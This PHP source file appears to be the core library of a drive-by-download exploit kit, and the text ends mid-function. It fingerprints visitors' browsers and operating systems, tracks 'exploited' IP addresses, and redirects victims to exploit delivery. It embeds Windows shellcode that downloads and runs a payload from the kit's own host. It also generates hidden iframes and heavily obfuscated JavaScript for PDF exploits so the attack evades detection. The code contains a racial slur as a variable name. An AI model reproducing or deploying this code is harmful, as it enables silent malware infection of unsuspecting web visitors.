<?php


class CPGeoIP {
	function GetCountry($ip) {
		$country_query = '' . 'SELECT country_code2,country_name FROM iptoc WHERE IP_FROM<=inet_aton(\'' . $ip . '\') AND IP_TO>=inet_aton(\'' . $ip . '\')';
		$country_exec = mysql_query( $country_query );
		$ccode_array = mysql_fetch_array( $country_exec );
		$country_code = $ccode_array['country_code2'];
		$country_name = $ccode_array['country_name'];

		if ($country_code == NULL) {
			$country_code = 'Unknown';
		}

		return $country_code;
	}

	function GetCountryNameByShort($short) {
		global $GEOIP_COUNTRY_CODE_TO_NUMBER;
		global $GEOIP_COUNTRY_NAMES;

		if (isset( $GEOIP_COUNTRY_NAMES[$GEOIP_COUNTRY_CODE_TO_NUMBER[$short]] )) {
			$ret = strtolower( $GEOIP_COUNTRY_NAMES[$GEOIP_COUNTRY_CODE_TO_NUMBER[$short]] );
		}
		else {
			$ret = 'Unknown';
		}

		return $ret;
	}
}

class CPFunctions {
	function IsBadIp($ip) {
		global $BadIps;

		$count = count( $BadIps );
		$x = 0;

		while ($x < $count) {
			if (preg_match( '/^' . str_replace( array( '\*', '\?' ), array( '(.*?)', '[0-9]' ), preg_quote( $BadIps[$x] ) ) . '$/', $ip )) {
				return 0;
			}

			++$x;
		}

		return 0;
	}

	function Error404() {
		global $cpMySQL;

		$cpMySQL->ConnectMySQL(  );

		if ($cpMySQL->DataDecrypt( REDIRECT )) {
			header( 'Location: ' . $cpMySQL->DataDecrypt( REDIRURL ) . '' );
		}
		else {
			echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL ' . (stristr( $_SERVER['PHP_SELF'], '/index.php' ) ? '/' : $_SERVER['PHP_SELF']) . ' was not found on this server.</p></body></html>';
		}

		exit(  );
	}

	function Error404Dupe() {
		echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL ' . (stristr( $_SERVER['PHP_SELF'], '/index.php' ) ? '/' : $_SERVER['PHP_SELF']) . ' was not found on this server.</p></body></html>';
		exit(  );
	}

	function MSIEVersion($user_agent) {
		if (strpos( $user_agent, 'MSIE' )) {
			$temp = explode( ';', substr( $user_agent, strpos( $user_agent, 'MSIE' ) + 5 ) );
			$version = $temp[0];
			$x = strtok( $version, '.' );
			return $x;
		}

	}

	function CompareIp($ip) {
		$getip = self::getip(  );

		if ($ip == strtoupper( md5( $getip ) )) {
			return 1;
		}

		return 0;
	}

	function GetOS($user_agent) {
		if (strstr( $user_agent, 'Win 9x 4.9' )) {
			$os = 'me';
		}
		else {
			if (strstr( $user_agent, 'Windows NT 5.0' )) {
				$os = '2k';
			}
			else {
				if (strstr( $user_agent, 'Windows NT 5.1' )) {
					$os = 'xp';
				}
				else {
					if (strstr( $user_agent, 'Windows XP' )) {
						$os = 'xp';
					}
					else {
						if (strstr( $user_agent, 'Windows NT 5.2' )) {
							$os = '2k3';
						}
						else {
							if (strstr( $user_agent, 'Windows NT 6.0' )) {
								$os = 'vista';
							}
							else {
								if (strstr( $user_agent, 'Windows NT 6.1' )) {
									$os = 'seven';
								}
								else {
									$os = 'Unknown';
								}
							}
						}
					}
				}
			}
		}

		return $os;
	}

	function GetBrowser($user_agent) {
		if (strstr( $user_agent, 'Opera' )) {
			$browser = 'op';
		}
		else {
			if (strstr( $user_agent, 'MSIE' )) {
				$browser = 'ie';
			}
			else {
				if (strstr( $user_agent, 'Firefox' )) {
					$browser = 'ff';
				}
				else {
					if (strstr( $user_agent, 'Chrome' )) {
						$browser = 'ch';
					}
					else {
						$browser = 'Unknown';
					}
				}
			}
		}

		return $browser;
	}

	function GetVersion($user_agent) {
		$ver = array(  );

		if (( preg_match( '#(Firefox)/([0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2})#i', $user_agent, $ver ) || preg_match( '#(Firefox)/([0-9]{1,2}.[0-9]{1,2})#i', $user_agent, $ver ) )) {
			$version = $ver[2];
		}
		else {
			if (preg_match( '#(MSIE) ([0-9]{1,2})#i', $user_agent, $ver )) {
				$version = $ver[2];
			}
			else {
				if (( preg_match( '#(Opera) ([0-9]{1,2}.[0-9]{1,3}){0,1}#i', $user_agent, $ver ) || preg_match( '#(Opera)/([0-9]{1,2}.[0-9]{1,3}){0,1}#i', $user_agent, $ver ) )) {
					$version = $ver[2];
				}
				else {
					if (preg_match( '#(Chrome)/([0-9]{1,2}.[0-9]{1,3})#i', $user_agent, $ver )) {
						$version = $ver[2];
					}
					else {
						$version = '0';
					}
				}
			}
		}

		return $version;
	}

	function GetIP() {
		return (isset( $_SERVER['REMOTE_ADDR'] ) ? $_SERVER['REMOTE_ADDR'] : getenv( 'REMOTE_ADDR' ));
	}

	function SendExploit($eid) {
		echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=get.php?eid=' . $eid . '">';
	}

	function RandStr($len) {
		$result = '';
		$nums = '1234567890';
		$syms = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
		$sux = $nums . $syms;
		$i = 0;

		while ($i <= $len) {
			$num = rand( 0, strlen( $sux ) - 1 );
			$result .= $sux[$num];
			++$i;
		}

		return $syms[rand( 0, strlen( $syms ) - 1 )] . $result;
	}

	function RandAlpha($length) {
		$random = '';
		$i = 0;

		while ($i < $length) {
			$random .= chr( (!rand( 0, 1 ) ? rand( 71, 90 ) : rand( 103, 122 )) );
			++$i;
		}

		return $random;
	}

	function RandLtr($length, $alpha) {
		switch ($alpha) {
		case 0: {
				$vowels = 'aeuyAEUY';
				$consonants = 'bdghjmnpqrstvzBDGHJLMNPQRSTVWXZ23456789@#$%';
				break;
			}

		case 1: {
				$vowels = 'aeuyAEUY';
				$consonants = 'bdghjmnpqrstvzBDGHJLMNPQRSTVWXZ';
				break;
			}

		case 2: {
				$vowels = 'aeuyAEUY';
				$consonants = 'bdghjmnpqrstvzBDGHJLMNPQRSTVWXZ';
			}
		}

		$password = '';
		$alt = time(  ) % 2;
		$i = 0;

		while ($i < $length) {
			if ($alt == 1) {
				$password .= $consonants[rand(  ) % strlen( $consonants )];
				$alt = 0;
			}
			else {
				$password .= $vowels[rand(  ) % strlen( $vowels )];
				$alt = 1;
			}

			++$i;
		}

		return $password;
	}

	function CreateArrayString($len, $c) {
		$srt_array = array(  );
		$a = 0;

		while ($a <= $c) {
			$result = '';
			$nums = 'abcdefghijkl';
			$syms = 'mnopqrstuvwxyz';
			$sux = $nums . $syms;
			$i = 0;

			while ($i < $len) {
				$num = rand( 0, strlen( $sux ) - 1 );
				$result .= $sux[$num];
				++$i;
			}

			$srt_array[] = $syms[rand( 0, strlen( $syms ) - 1 )] . $result;
			++$a;
		}

		return $srt_array;
	}
}

class CPackMySQL {
	function ConnectMySQL() {
		global $cpMySQL;

		if (!( mysql_connect( $cpMySQL->DataDecrypt( MYSQLHOST ), $cpMySQL->DataDecrypt( MYSQLUSER ), $cpMySQL->DataDecrypt( MYSQLPASS ) ))) {
			exit( 'Mysql error?' );
			(bool)true;
		}

		mysql_select_db( $cpMySQL->DataDecrypt( MYSQLDB ) );
	}

	function DataEncrypt($string) {
		global $GlobalKey;

		$string = RC4::encrypt( $GlobalKey, $string );
		$string = base64_encode( $string );
		return $string;
	}

	function DataDecrypt($string) {
		global $GlobalKey;

		$string = base64_decode( $string );
		$string = RC4::decrypt( $GlobalKey, $string );
		return $string;
	}

	function AddExploitedIp($sploit = '', $browser, $os, $extra = '', $country = '', $referer = '', $version = '') {
		global $cpFunctions;
		global $cpMySQL;

		$ip = $cpFunctions->GetIP(  );
		$count = mysql_query( 'SELECT * FROM `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'peeps` WHERE ip = \'' . $ip . '\'' );

		if (0 < mysql_num_rows( $count )) {
			$sql = 'UPDATE `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'peeps` SET sploit = \'' . $sploit . '\', extra = \'' . $extra . '\',  browser = \'' . $browser . '\', os = \'' . $os . '\' WHERE ip = \'' . $ip . '\'';
		}
		else {
			$sql = 'INSERT INTO `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'peeps` SET sploit = \'' . $sploit . '\', extra = \'' . $extra . '\', browser = \'' . $browser . '\', os = \'' . $os . '\', referer = \'' . $referer . '\', ip = \'' . $ip . '\', country = \'' . $country . '\',version = \'' . $version . '\'';
		}

		mysql_query( $sql );

		if (mysql_errno(  )) {
			return false;
		}

		return true;
	}

	function ClearDB() {
		global $cpMySQL;

		$sql = 'TRUNCATE TABLE `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'peeps`';
		mysql_query( $sql );
	}

	function antisqli($str) {
		$str = strip_tags( $str );
		$str = trim( $str );
		$str = htmlspecialchars( $str );
		$str = addslashes( $str );
		return $str;
	}

	function ExploitId($id) {
		global $cpMySQL;

		mysql_query( 'DELETE FROM ' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'expid WHERE exploitid = \'' . self::antisqli( $id ) . '\'' );
		$ret = self::addid(  );
		return $ret;
	}

	function AddId() {
		global $cpMySQL;
		global $cpFunctions;

		$id = $cpFunctions->RandStr( 15 );
		mysql_query( 'INSERT INTO ' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'expid SET exploitid = \'' . $id . '\'' );
		return $id;
	}

	function RemoveId($id) {
		global $cpMySQL;

		mysql_query( 'DELETE FROM ' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'expid WHERE exploitid = \'' . self::antisqli( $id ) . '\'' );
	}

	function CheckId($id) {
		global $cpMySQL;

		$count = mysql_query( 'SELECT * FROM `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'expid` WHERE exploitid = \'' . self::antisqli( $id ) . '\'' );

		if (mysql_num_rows( $count ) < 1) {
			return 0;
		}

		return 1;
	}
}

class CPackExploitHelper {
	function GetURL($exploit, $browser, $os, $ExploitID) {
		$dirname = dirname( $_SERVER['PHP_SELF'] );
		$host = $_SERVER['HTTP_HOST'];
		$url = 'http://' . $host . (strlen( $dirname ) <= 1 ? '' : str_replace( '\', '/', $dirname )) . '/';

			if ($ExploitID == 'multi') {
				$loader = $url . 'load.php?spl=' . $exploit . '&b=' . $browser . '&o=' . $os;
			}
else {
				$loader = $url . 'load.php?spl=' . $exploit . '&b=' . $browser . '&o=' . $os . '&i=' . $ExploitID;
			}

			return $loader;
		}

		function GetNormalURL() {
			$dirname = dirname( $_SERVER['PHP_SELF'] );
			$host = $_SERVER['HTTP_HOST'];
			$url = 'http://' . $host . (strlen( $dirname ) <= 1 ? '' : str_replace( '\', '/', $dirname )) . '/';
				$loader = $url;
				return $loader;
			}

			function GetShellCode($url) {
				return '%u56e8%u0000%u5300%u5655%u8b57%u246c%u8b18%u3c45%u548b%u7805%uea01%u4a8b%u8b18%u205a%ueb01%u32e3%u8b49%u8b34%uee01%uff31%u31fc%uacc0%ue038%u0774%ucfc1%u010d%uebc7%u3bf2%u247c%u7514%u8be1%u245a%ueb01%u8b66%u4b0c%u5a8b%u011c%u8beb%u8b04%ue801%u02eb%uc031%u5e5f%u5b5d%u08c2%u5e00%u306a%u6459%u198b%u5b8b%u8b0c%u1c5b%u1b8b%u5b8b%u5308%u8e68%u0e4e%uffec%u89d6%u53c7%u8e68%u0e4e%uffec%uebd6%u5a50%uff52%u89d0%u52c2%u5352%uaa68%u0dfc%uff7c%u5ad6%u4deb%u5159%uff52%uebd0%u5a72%u5beb%u6a59%u6a00%u5100%u6a52%uff00%u53d0%ua068%uc9d5%uff4d%u5ad6%uff52%u53d0%u9868%u8afe%uff0e%uebd6%u5944%u006a%uff51%u53d0%u7e68%ue2d8%uff73%u6ad6%uff00%ue8d0%uffab%uffff%u7275%u6d6c%u6e6f%u642e%u6c6c%ue800%uffae%uffff%u5255%u444c%u776f%u6c6e%u616f%u5464%u466f%u6c69%u4165%ue800%uffa0%uffff%u2e2e%u795c%ue800%uffb7%uffff%u2e2e%u795c%ue800%uff89%uffff' . self::encodeurl( $url );
			}

			function iframecrypt($url) {
				global $cpFunctions;
				global $sep;

				$sep = $cpFunctions->RandLtr( rand( 8, 18 ), 2 );
				$randStr = $cpFunctions->CreateArrayString( 10, 25 );
				$x = '';
				$x .= '<script language=JavaScript>
';
				$x .= 'var ' . $randStr[1] . ' = \'' . StrToHexStr( '<if', $sep ) . '\';';
				$x .= 'var ' . $randStr[2] . ' = \'' . StrToHexStr( 'r', $sep ) . '\';';
				$x .= 'var ' . $randStr[3] . ' = \'' . StrToHexStr( 'ame name="', $sep ) . '\';';
				$x .= 'var ' . $randStr[4] . ' = \'' . StrToHexStr( $randStr[19], $sep ) . '\';';
				$x .= 'var ' . $randStr[5] . ' = \'' . StrToHexStr( '" width="1" height="0"', $sep ) . '\';';
				$x .= 'var ' . $randStr[6] . ' = \'' . StrToHexStr( ' src="', $sep ) . '\';';
				$x .= 'var ' . $randStr[7] . ' = \'' . StrToHexStr( 'http://', $sep ) . '\';';
				$x .= 'var ' . $randStr[8] . ' = \'' . $url . '\';';
				$x .= 'var ' . $randStr[9] . ' = \'' . StrToHexStr( '" marginwidth="1" marginheight="0" title="', $sep ) . '\';';
				$x .= 'var ' . $randStr[10] . ' = \'' . StrToHexStr( $randStr[19], $sep ) . '\';';
				$x .= 'var ' . $randStr[11] . ' = \'' . StrToHexStr( '" scrolling="no" border="0" frameborder="0">', $sep ) . '\';';
				$x .= 'var ' . $randStr[12] . ' = \'' . StrToHexStr( '</if', $sep ) . '\';';
				$x .= 'var ' . $randStr[13] . ' = \'' . StrToHexStr( 'ra', $sep ) . '\';';
				$x .= 'var ' . $randStr[14] . ' = \'' . StrToHexStr( 'me>', $sep ) . '\';';
				$x .= 'var ' . $randStr[15] . ' = new Array();';
				$x .= '' . $randStr[15] . '[0]=new Array(' . $randStr[1] . '+' . $randStr[2] . '+' . $randStr[3] . '+' . $randStr[4] . '+' . $randStr[5] . '+' . $randStr[6] . '+' . $randStr[7] . '+' . $randStr[8] . '+' . $randStr[9] . '+' . $randStr[10] . '+' . $randStr[11] . '+' . $randStr[12] . '+' . $randStr[13] . '+' . $randStr[14] . ');';
				$x .= 'document[\'' . $sep . 'w' . $sep . 'r' . $sep . 'i' . $sep . 't' . $sep . 'e' . $sep . '\'.replace(/' . $sep . '/g,\'\')](window[\'' . $sep . 'u' . $sep . 'n' . $sep . 'e' . $sep . 's' . $sep . 'c' . $sep . 'a' . $sep . 'p' . $sep . 'e' . $sep . '\'.replace(/' . $sep . '/g,\'\')](' . $randStr[15] . '.toString().replace(/' . $sep . '/g,\'%\')));';
				$x .= '</script>';
				return $x;
			}

			function EncodeURL($s) {
				$out = '';
				$res = bin2hex( $s );
				$g = round( strlen( $res ) / 4 );

				if ($g != strlen( $res ) / 4) {
					$res .= '00';
				}

				$i = 0;

				while ($i < strlen( $res )) {
					$out .= '%u' . substr( $res, $i + 2, 2 ) . substr( $res, $i, 2 );
					$i += 4;
				}

				return $out;
			}

			function EncodeScript($s) {
				$out = '';
				$res = bin2hex( $s );
				$i = 0;

				while ($i < strlen( $res )) {
					if (strlen( substr( $res, $i + 2, 2 ) ) != 0) {
						$out .= 'X' . substr( $res, $i + 2, 2 );
					}

					$i += 2;
				}

				return $out;
			}

			function shellcode2unicode($shellcode) {
				$res = '';
				$i = 0;

				while ($i < strlen( $shellcode )) {
					$sim1 = substr( $shellcode, $i + 1, 1 );
					$sim2 = substr( $shellcode, $i, 1 );
					$res .= '%u';
					$res .= bin2hex( $sim1 );
					$res .= bin2hex( $sim2 );
					$i += 2;
				}

				return $res;
			}

			function generate_shellcode($url) {
				$shellcode_template = 'è';
				$shellcode1 = substr( $shellcode_template, 0, 322 );
				$shellcode2 = '';
				$i = 0;

				while ($i < strlen( $url )) {
					$shellcode2 .= chr( ord( substr( $url, $i, 1 ) ) ^ 61 );
					++$i;
				}

				$shellcode2 .= '=====';
				$shellcode3 = substr( $shellcode_template, 322 + $i + 5 );
				return self::shellcode2unicode( $shellcode1 . $shellcode2 . $shellcode3 );
			}

			function GetJSShellcode($url, $rep) {
				$x = str_replace( '%u', $rep, self::generate_shellcode( $url . '&cp=' ) );
				return $x;
			}

			function RandOccurance($str) {
				$out = '';
				$x = 0;

				while ($x < rand( 1, 5 )) {
					$out .= $str;
					++$x;
				}

				return $str;
			}

			function randFuncs($randomStr, $in, $in2) {
				$x = '';
				$i = 0;

				while ($i <= 150) {
					$x .= 'function ' . $randomStr[$i] . '(){ ' . $randomStr[$i + 1] . '(); }
';
					++$i;
				}

				$x .= 'function ' . $randomStr[$i] . '(){ ' . $in . '(' . $in2 . '); }
';
				return $x;
			}

			function RC4($key, $text) {
				$s = array(  );
				$i = 0;

				while ($i < 256) {
					$s[$i] = $i;
					++$i;
				}

				$j = 0;
				$x;
				$i = 0;

				while ($i < 256) {
					$j = ( $j + $s[$i] + ord( $key[$i % strlen( $key )] ) ) % 256;
					$x = $s[$i];
					$s[$i] = $s[$j];
					$s[$j] = $x;
					++$i;
				}

				$i = 0;
				$j = 0;
				$output = '';
				$y;
				$y = 0;

				while ($y < strlen( $text )) {
					$i = ( $i + 1 ) % 256;
					$j = ( $j + $s[$i] ) % 256;
					$x = $s[$i];
					$s[$i] = $s[$j];
					$s[$j] = $x;
					$output .= $text[$y] ^ chr( $s[( $s[$i] + $s[$j] ) % 256] );
					++$y;
				}

				return $output;
			}

			function XorStr($reps, $input, $char) {
				$res = '';
				$len = strlen( $input );
				$i = 0;

				while ($i < $len) {
					$res .= $reps . bin2hex( chr( ord( $input[$i] ) ^ 2 ) );
					++$i;
				}

				return $char . '(\'' . $res . '\')';
			}

			function randFunc($randomStr, $in) {
				$x = '';
				$i = 0;

				while ($i <= 150) {
					$x .= 'function ' . $randomStr[$i] . '(){ ' . $randomStr[$i + 1] . '(); }';
					++$i;
				}

				$x .= 'function ' . $randomStr[$i] . '(){ ' . $in . ' }';
				return $x;
			}

			function CryptPDF($in) {
				global $cpXplHelper;
				global $cpFunctions;

				$in = trim( JSMin::minify( $in ) );
				$CPJunkCode = $cpFunctions->CreateArrayString( rand( 5, 20 ), '13' );
				$s = str_split( $in );
				$data = '';
				$sep = $cpFunctions->RandLtr( 1, 2 );
				$z = 0;

				while ($z < count( $s )) {
					$data .= $sep . ord( $s[$z] );
					++$z;
				}

				$rez = '
		var ' . $CPJunkCode[1] . ' = "' . $data . '";
		var ' . $CPJunkCode[2] . ' = ' . $CPJunkCode[1] . '.split("' . $sep . '");
		var ' . $CPJunkCode[3] . ' = "";
		for (var ' . $CPJunkCode[4] . '=1; ' . $CPJunkCode[4] . '<' . $CPJunkCode[2] . '.length; ' . $CPJunkCode[4] . '++){
			' . $CPJunkCode[3] . '+=String.fromCharCode(' . $CPJunkCode[2] . '[' . $CPJunkCode[4] . ']);
		}
		eval(' . $CPJunkCode[3] . ')
		';
				$string = trim( JSMin::minify( $rez ) );
				$niggers = array(  );
				$returned = 'eval(String.fromCharCode(';
				$i = 0;

				while ($i < strlen( $string )) {
					$niggers[] = ord( substr( substr( $string, $i, $i + 1 ), 0, 1 ) );
					++$i;
				}

				$returned = $returned . join( ',', $niggers ) . '))';
				$returned = $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $cpXplHelper->junkCode(  ) . $returned;
				return $returned;
			}

			function CryptPDF2($content) {
				global $CPRandomString;

				if (empty( $content )) {
					return '';
				}

				$content = str_replace( '
', ' ', $content );
				$content = str_replace( '
', ' ', $content );
				$content = str_replace( '	', ' ', $content );
				$i = 0;

				while ($i < 10) {
					$content = str_replace( '  ', ' ', $content );
					++$i;
				}

				$table = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_@';
				$xor = rand( 5, 255 );
				$table = array_keys( count_chars( $table, 1 ) );
				$i_min = min( $table );
				$i_max = max( $table );
				$r = 0;
				$enc = '';
				$c = count( $table );

				while (0 < $c) {
					array_splice( $table, $r, $c - $r, array_reverse( array_slice( $table, $r, $c - $r ) ) );
					$r = mt_rand( 0, $c-- );
				}

				$len = strlen( $content );
				$word = $shift = 0;
				$i = 0;

				while ($i < $len) {
					$ch = $xor ^ ord( $content[$i] );
					$word |= $ch << $shift;
					$shift = ( $shift + 2 ) % 6;
					$enc .= chr( $table[$word & 63] );
					$word >>= 6;

					if (!$shift) {
						$enc .= chr( $table[$word] );
						$word >>= 9;
					}

					++$i;
				}


				if ($shift) {
					$enc .= chr( $table[$word] );
				}

				$tbl = array_fill( $i_min, $i_max - $i_min + 1, 0 );

				while (list( $k, $v ) = each( $table )) {
					$tbl[$v] = $k;
				}

				$tbl = implode( ',', $tbl );
				$r = '' . self::junkcode(  ) . '' . self::junkcode(  ) . 'var ' . $CPRandomString[29] . ' = "' . $CPRandomString[12] . '";' . self::junkcode(  ) . '' . self::junkcode(  ) . '' . self::junkcode(  ) . '' . self::junkcode(  ) . 'var ' . $CPRandomString[30] . ' = "' . $CPRandomString[12] . '";var ' . $CPRandomString[10] . ' = {' . $CPRandomString[11] . ' : "A"+"B"+"C"+"D"+"E"+"F"+"G"+"H"+"I"+"J"+"K"+"L"+"M"+"N"+"O"+"P"+"Q"+"R"+"S"+"T"+"U"+"V"+"W"+"X"+"Y"+"Z"+"a"+"b"+"c"+"d"+"e"+"f"+"g"+"h"+"i"+"j"+"k"+"l"+"m"+"n"+"o"+"p"+"q"+"r"+"s"+"t"+"u"+"v"+"w"+"x"+"y"+"z"+"0"+"1"+"2"+"3"+"4"+"5"+"6"+"7"+"8"+"9"+"+"+"/"+"=",' . $CPRandomString[9] . ' : function (' . $CPRandomString[8] . ') {var ' . $CPRandomString[12] . ' = "' . $CPRandomString[12] . '";' . self::junkcode(  ) . 'var ' . $CPRandomString[13] . ' = "' . $CPRandomString[13] . '";' . self::junkcode(  ) . 'var ' . $CPRandomString[14] . ' = "' . $CPRandomString[13] . '";' . self::junkcode(  ) . 'var ' . $CPRandomString[7] . ' = "";' . self::junkcode(  ) . 'var ' . $CPRandomString[4] . ', ' . $CPRandomString[5] . ', ' . $CPRandomString[6] . ';' . self::junkcode(  ) . 'var ' . $CPRandomString[0] . ', ' . $CPRandomString[1] . ', ' . $CPRandomString[2] . ', ' . $CPRandomString[3] . ';' . self::junkcode(  ) . 'var i = 0;' . $CPRandomString[8] . ' = ' . $CPRandomString[8] . '.replace(/[^A-Za-z0-9\+\/\=]/g, "");while (i < ' . $CPRandomString[8] . '.length) {' . self::junkcode(  ) . '' . $CPRandomString[0] . ' = this.' . $CPRandomString[11] . '.indexOf(' . $CPRandomString[8] . '.charAt(i++));' . self::junkcode(  ) . '' . self::junkcode(  ) . '' . self::junkcode(  ) . '' . $CPRandomString[1] . ' = this.' . $CPRandomString[11] . '.indexOf(' . $CPRandomString[8] . '.charAt(i++));' . self::junkcode(  ) . '' . $CPRandomString[2] . ' = this.' . $CPRandomString[11] . '.indexOf(' . $CPRandomString[8] . '.charAt(i++));' . self::junkcode(  ) . '' . $CPRandomString[3] . ' = this.' . $CPRandomString[11] . '.indexOf(' . $CPRandomString[8] . '.charAt(i++));' . $CPRandomString[4] . ' = (' . $CPRandomString[0] . ' << 2) | (' . $CPRandomString[1] . ' >> 4);' . self::junkcode(  ) . '' . $CPRandomString[5] . ' = ((' . $CPRandomString[1] . ' & 15) << 4) | (' . $CPRandomString[2] . ' >> 2);' . self::junkcode(  ) . '' . $CPRandomString[6] . ' = ((' . $CPRandomString[2] . ' & 3) << 6) | ' . $CPRandomString[3] . ';' . $CPRandomString[7] . ' = ' . $CPRandomString[7] . ' + String.fromCharCode(' . $CPRandomString[4] . ');if (' . $CPRandomString[2] . ' != 64) {' . self::junkcode(  ) . 'var ' . $CPRandomString[16] . ' = "' . $CPRandomString[12] . '";' . self::junkcode(  ) . '' . $CPRandomString[7] . ' = ' . $CPRandomString[7] . ' + String.fromCharCode(' . $CPRandomString[5] . ');' . self::junkcode(  ) . 'var ' . $CPRandomString[15] . ' = "' . $CPRandomString[12] . '";}if (' . $CPRandomString[3] . ' != 64) {' . self::junkcode(  ) . 'var ' . $CPRandomString[17] . ' = "' . $CPRandomString[12] . '";' . self::junkcode(  ) . 'var ' . $CPRandomString[18] . ' = "' . $CPRandomString[12] . '";' . self::junkcode(  ) . '' . $CPRandomString[7] . ' = ' . $CPRandomString[7] . ' + String.fromCharCode(' . $CPRandomString[6] . ');}}var ' . $CPRandomString[19] . ' = "' . $CPRandomString[12] . '";eval(' . $CPRandomString[7] . ');}}var ' . $CPRandomString[21] . ' = "' . $CPRandomString[12] . '";' . self::junkcode(  ) . '' . self::junkcode(  ) . 'var ' . $CPRandomString[22] . ' = "' . $CPRandomString[12] . '";var ' . $CPRandomString[23] . ' = "' . $CPRandomString[12] . '";' . self::junkcode(  ) . 'var ' . $CPRandomString[24] . ' = "' . $CPRandomString[12] . '";var ' . $CPRandomString[25] . ' = "' . $CPRandomString[12] . '";' . self::junkcode(  ) . '' . $CPRandomString[10] . '.' . $CPRandomString[9] . '("' . base64_encode( 'function ' . $CPRandomString[41] . '(' . $CPRandomString[42] . '){ return String[\'fromCharCode\'](' . $CPRandomString[42] . ');} function ' . $CPRandomString[28] . '(' . $CPRandomString[29] . '){' . self::junkcode(  ) . 'var ' . $CPRandomString[40] . '=0, ' . $CPRandomString[30] . '=' . $CPRandomString[29] . '.length, ' . $CPRandomString[31] . '=1024, ' . $CPRandomString[32] . ', ' . $CPRandomString[33] . ', ' . $CPRandomString[34] . '=\'\', ' . $CPRandomString[35] . '=' . $CPRandomString[40] . ', ' . $CPRandomString[36] . '=' . $CPRandomString[40] . ', ' . $CPRandomString[37] . '=' . $CPRandomString[40] . ', ' . $CPRandomString[38] . '=Array(' . $tbl . ');' . self::junkcode(  ) . 'for(' . $CPRandomString[33] . '=Math.ceil(' . $CPRandomString[30] . '/' . $CPRandomString[31] . ');' . $CPRandomString[33] . '>' . $CPRandomString[40] . ';' . $CPRandomString[33] . '--){ for(' . $CPRandomString[32] . '=Math.min(' . $CPRandomString[30] . ',' . $CPRandomString[31] . ');' . $CPRandomString[32] . '>' . $CPRandomString[40] . ';' . $CPRandomString[32] . '--,' . $CPRandomString[30] . '--){' . $CPRandomString[37] . '|=(' . $CPRandomString[38] . '[' . $CPRandomString[29] . '.charCodeAt(' . $CPRandomString[35] . '++)-' . $i_min . '])<<' . $CPRandomString[36] . '; if(' . $CPRandomString[36] . '){' . $CPRandomString[34] . '+=' . $CPRandomString[41] . '(' . $xor . '^' . $CPRandomString[37] . '&255); ' . $CPRandomString[37] . '>>=8; ' . $CPRandomString[36] . '-=2; } else {' . $CPRandomString[36] . '=6; } }' . self::junkcode(  ) . '' . self::junkcode(  ) . '} eval(' . $CPRandomString[34] . ');} ' . $CPRandomString[28] . '(\'' . $enc . '\');' ) . '");var ' . $CPRandomString[26] . ' = "' . $CPRandomString[12] . '";' . self::junkcode(  ) . 'var ' . $CPRandomString[27] . ' = "' . $CPRandomString[12] . '";' . self::junkcode(  ) . '' . self::junkcode(  ) . '';
				return $r;
			}

			function binhex($str) {
				$strl = strlen( $str );
				$fin = '';
				$i = 0;

				while ($i < $strl) {
					$fin .= '#' . dechex( ord( $str[$i] ) );
					++$i;
				}

				return $fin;
			}

			function StringFuck($string) {
				if (mt_rand( 1, 4 ) <= 2) {
					$string = self::binhex( $string );
				}

				return $string;
			}

			function randDiv() {
				global $cpFunctions;

				$y = '';
				$x = 0;

				while ($x < rand( 1, 3 )) {
					$y .= '<div id="' . $cpFunctions->RandLtr( rand( 7, 10 ), 2 ) . '"  style="display: none">' . base64_encode( $cpFunctions->RandLtr( rand( 15, 500 ), 2 ) ) . '</div>';
					++$x;
				}

				return $y;
			}

			function junkCode() {
				global $cpFunctions;

				$CPJunkCode = $cpFunctions->CreateArrayString( rand( 5, 20 ), '13' );
				$code = 'var ' . $CPJunkCode[1] . ' = "' . $CPJunkCode[13] . '";';

				if (mt_rand( 1, 3 ) == 1) {
					if (mt_rand( 1, 2 ) == 2) {
						$code .= 'var ' . $CPJunkCode[0] . '=Math.floor(Math.random()*' . mt_rand( 1, 999 ) . ');';
					}


					if (mt_rand( 1, 3 ) <= 2) {
						$code .= 'for (' . $CPJunkCode[2] . '=' . mt_rand( 1, 10 ) . ';' . $CPJunkCode[2] . '<=' . mt_rand( 10, 99 ) . '+' . mt_rand( 1, 99 ) . ';' . $CPJunkCode[2] . '=' . $CPJunkCode[2] . '+' . mt_rand( 1, 99 ) . ') { ' . $CPJunkCode[1] . '=' . $CPJunkCode[1] . '+' . mt_rand( 1, 99 ) . '; }';
					}


					if (mt_rand( 1, 2 ) == 2) {
						$code .= 'var ' . $CPJunkCode[3] . ' = Math.floor(Math.random()*' . mt_rand( 1, 999 ) . '/' . mt_rand( 1, 999 ) . '^' . mt_rand( 1, 999 ) . '*' . mt_rand( 1, 999 ) . '/' . mt_rand( 1, 999 ) . '^' . mt_rand( 1, 999 ) . ');';
					}


					if (mt_rand( 1, 7 ) <= 4) {
						$code .= 'var ' . $CPJunkCode[4] . ' = ' . mt_rand( 999, 100000 ) . ';';
					}


					if (mt_rand( 1, 15 ) <= 12) {
						$code .= '
';
